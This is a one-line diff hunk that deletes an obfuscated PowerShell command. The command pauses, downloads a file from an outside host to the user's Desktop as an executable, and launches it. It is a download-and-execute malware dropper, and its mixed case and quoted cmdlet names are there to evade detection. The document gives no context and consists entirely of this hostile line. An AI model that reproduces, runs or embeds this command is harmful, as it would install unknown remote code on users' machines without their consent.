@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dOwNLoaDFiLE.iNVoKE('http://vafersoma.com/sam32','$Des\3221001.exe');&'Start-Process' $Des\3221001.exe
